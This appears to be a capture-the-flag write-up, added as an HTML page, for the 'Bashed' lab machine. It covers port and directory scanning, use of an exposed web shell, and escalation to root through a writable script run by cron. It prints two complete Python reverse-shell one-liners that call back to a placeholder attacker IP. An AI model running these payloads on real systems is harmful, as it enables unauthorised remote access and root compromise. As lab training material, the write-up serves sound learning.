@@ -1,0 +1,133 @@
+<!doctype html>
+<html>
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>Bashed</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="../../assets/css/writeups_style.css" type="text/css" />
+</head>
+<body>
+  <div class="page">
+    <h1 class="title">Bashed</h1>
+
+    <section>
+      <h2>Initial Enumeration</h2>
+      <p>
+        I start by performing a full port scan to identify exposed services on the target machine.
+      </p>
+
+      <div class="code-block">
+        <pre><code>nmap -Pn -sV -sC -p- --open 10.10.10.68 -oN scan.txt</code></pre>
+      </div>
+
+      <p>
+        The scan reveals that only an <strong>HTTP</strong> service is running.
+        At first glance, the website does not appear to expose anything particularly interesting.
+      </p>
+    </section>
+
+    <section>
+      <h2>Directory Enumeration</h2>
+      <p>
+        I proceed with directory enumeration using <strong>dirb</strong>
+        to discover hidden directories and files.
+      </p>
+
+      <div class="code-block">
+        <pre><code>dirb http://10.10.10.68/</code></pre>
+      </div>
+
+      <p>
+        This enumeration reveals two interesting directories:
+        <span class="highlight">/dev</span> and <span class="highlight">/uploads</span>.
+      </p>
+
+      <p>
+        Inside the <code>/dev</code> directory, I find two files.
+        One of them, <code>phpbash.php</code>, provides a web-based command execution interface.
+      </p>
+    </section>
+
+    <section>
+      <h2>Initial Access</h2>
+      <p>
+        Since the web interface allows command execution, I leverage it to obtain
+        a reverse shell using PHP.
+      </p>
+
+      <p>
+        First, I set up a listener on my attacking machine.
+      </p>
+
+      <img src="images/26-1.png" alt="Netcat listener">
+
+      <p>
+        I then execute the following Python reverse shell payload:
+      </p>
+
+      <div class="code-block">
+        <pre><code>python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("&lt;IP&gt;",&lt;PORT&gt;));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</code></pre>
+      </div>
+
+      <p>
+        This successfully grants me a shell on the target system.
+      </p>
+    </section>
+
+    <section>
+      <h2>User Enumeration</h2>
+      <p>
+        While enumerating the system, I discover that the user
+        <strong>scriptmanager</strong> is allowed to execute commands with <code>sudo</code>.
+      </p>
+
+      <img src="images/26-2.png" alt="sudo permissions">
+
+      <p>
+        I switch to the <strong>scriptmanager</strong> user to continue my enumeration.
+      </p>
+
+      <img src="images/26-3.png" alt="User switch">
+
+      <p>
+        To search for privilege escalation vectors, I upload and execute
+        <strong>linpeas.sh</strong> on the target machine.
+      </p>
+    </section>
+
+    <section>
+      <h2>Privilege Escalation</h2>
+      <p>
+        LinPEAS reveals a directory named <code>/scripts</code>.
+        Inside this directory, a Python script called <code>test.py</code>
+        writes output to a file named <code>test.txt</code>.
+      </p>
+
+      <p>
+        The file <code>test.txt</code> is owned by the <strong>root</strong> user,
+        but the script <code>test.py</code> is writable by my current user.
+      </p>
+
+      <p>
+        This indicates that a scheduled task (likely a <strong>cron job</strong>)
+        is periodically executing scripts located in the <code>/scripts</code> directory.
+      </p>
+
+      <p>
+        I exploit this by creating a malicious Python script that executes
+        a reverse shell as root.
+      </p>
+
+      <div class="code-block">
+        <pre><code>echo "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"&lt;IP&gt;\",&lt;PORT&gt;));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);" &gt; .exploit.py</code></pre>
+      </div>
+
+      <p>
+        After starting a listener on my machine, the cron job executes the script
+        and I receive a reverse shell as <strong>root</strong>.
+      </p>
+    </section>
+  </div>
+</body>
+
+</html>
